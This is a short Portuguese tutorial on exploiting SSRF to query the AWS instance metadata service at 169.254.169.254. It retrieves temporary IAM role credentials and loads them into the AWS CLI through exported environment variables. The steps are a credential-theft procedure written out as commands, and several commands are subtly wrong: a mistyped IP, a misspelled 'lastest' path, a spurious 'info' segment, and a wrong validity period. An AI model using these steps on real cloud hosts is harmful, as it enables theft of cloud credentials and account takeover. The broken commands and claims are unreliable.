
Como usar uma vulnerabilidade SSRF para acessar os metadados de instância em ambienes AWS
1 - Precisamo entender o funcionamento de alguns servidos dentro da AWS:
#### IAM
AWS Identity and Access Management (IAM) é um serviço da Web que ajuda você a controlar o acesso aos recursos da AWS de forma segura. Com o IAM, é possível gerenciar permissões que controlam quais recursos da AWS os usuários poderão acessar. Você usa o IAM para controlar quem é autenticado (fez login) e autorizado (tem permissões) a usar os recursos. O IAM fornece a infraestrutura necessária para controlar a autenticação e autorização de sua Contas da AWS.

### Metadata
Metadados da AWS referem-se a informações sobre recursos na nuvem AWS. Esses dados descrevem e fornecem detalhes sobre os recursos, auxiliando na organização, descoberta e gerenciamento. Os metadados podem ser usados para rastrear informações como o tipo de recurso, localização, configurações, e também podem incluir dados personalizados adicionados pelo usuário.
Endereço IP do Metadata: 169.254.169.254 na rede interna

Podemos fazer uma requisição para esse endereço e ele vai reponder com as suas versões:
	```$ curl 169.254.169.254```
Então nesse endereço existe essa 'api' que traz essas informaçẽs
	```$ curl 169.254.169.154/latest/meta-data```
Acessando esse endereço vamos ter os dados que são utilizados para configurar a instancia.

Apartir do meta data é possivel gerar uma chave temporaria que vai nos dar acesso aos serviços que nossa instancia tem permissão, para listar os serviços:
	```$ aws s3 ls```
E para criar essa chave fica dentro de security-credentials/ ela é válida por 15 minutos
	```$ curl 169.254.169.254/lastest/meta-data/iam/info/security-credentials/```
Dentro desse endereço vai existir o nome da role e acessando essa role ele vai gerar uma chave temporaria de acesso a AWS
	```$ curl 169.254.169.254/lastest/meta-data/iam/info/security-credentials/nome_da_role```
Com os dados de "AccessKeyId", "SecretAccessKey" e "Token" é possivel acessar a AWS.
Com a AWS CLI instala podemos setar os valores dessas chaves acima dentro de variaveis de ambiente na nossa máquina e nos conectar a AWS.
```
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=asicnSDsdvSDVvnDSDvOSNsodnPISDPpd
```
Com a AWS CLI instalada basta nos conectar:
```$ aws iam get-user```
```$aws ec2 describe-instances``` informações das instancias na aws
